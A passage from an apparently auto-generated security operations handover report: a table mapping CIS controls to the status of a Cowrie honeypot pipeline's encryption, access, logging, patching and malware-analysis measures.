| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-02T07:37:28Z_
